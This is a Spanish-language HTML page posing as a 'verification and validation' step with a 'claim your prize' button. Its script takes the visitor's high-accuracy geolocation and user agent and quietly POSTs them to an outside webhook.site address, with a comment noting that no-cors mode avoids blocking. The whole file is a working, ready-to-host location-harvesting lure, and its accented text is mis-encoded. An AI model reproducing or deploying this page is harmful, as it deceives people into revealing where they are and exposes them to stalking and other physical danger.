<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificaci√≥n y Validaci√≥n</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; background: #f5f5f5; }
    h1 { color: #222; margin-top: 30px; }
    button { padding: 12px 25px; font-size: 18px; border: none; border-radius: 6px; background: #007bff; color: #fff; cursor: pointer; }
    button:hover { background: #0056b3; }
    pre { text-align: left; background: #fff; padding: 10px; border-radius: 6px; box-shadow: 0 0 5px rgba(0,0,0,0.1); max-width: 600px; margin: 20px auto; }
    #msg { margin-top: 15px; font-weight: bold; color: red; }
    a { display: block; margin-top: 15px; font-size: 18px; text-decoration: none; color: #007bff; }
  </style>
</head>
<body>
  <h1>‚úÖ VERIFICACI√ìN Y VALIDACI√ìN</h1>
  <p>Por favor, pulsa el bot√≥n y acepta la solicitud de ubicaci√≥n.</p>
  <button onclick="obtenerUbicacion()">üìç RECLAMA TU PREMIO</button>
  <p id="msg"></p>
  <pre id="output"></pre>
  <a id="mapsLink" href="#" target="_blank">Abrir en Google Maps üåç</a>

<script>
const WEBHOOK_URL = "https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639";

function obtenerUbicacion() {
  if (!navigator.geolocation) {
    document.getElementById("msg").textContent = "Tu navegador no soporta geolocalizaci√≥n.";
    return;
  }

  navigator.geolocation.getCurrentPosition(onSuccess, onError, {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0
  });
}

function onSuccess(pos) {
  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;
  const accuracy = pos.coords.accuracy;

  const data = {
    lat,
    lon,
    accuracy,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    maps_link: `https://www.google.com/maps?q=${lat},${lon}`,
    source: window.location.href
  };

  // Mostrar en pantalla
  document.getElementById("output").textContent = JSON.stringify(data, null, 2);
  document.getElementById("mapsLink").href = data.maps_link;
  document.getElementById("msg").textContent = "üì° Ubicaci√≥n detectada y enviada.";

  // Enviar al Webhook con no-cors
  fetch(WEBHOOK_URL, {
    method: "POST",
    mode: "no-cors",   // üîë evita bloqueo CORS
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data, null, 2)
  });
}

function onError(err) {
  let msg = "Error desconocido al obtener ubicaci√≥n.";
  if (err.code === 1) msg = "‚ùå Permiso denegado.";
  else if (err.code === 2) msg = "‚ö†Ô∏è Posici√≥n no disponible.";
  else if (err.code === 3) msg = "‚åõ Tiempo de espera agotado.";
  else msg = "Error: " + err.message;

  document.getElementById("msg").textContent = msg;
}
</script>
</body>
</html>


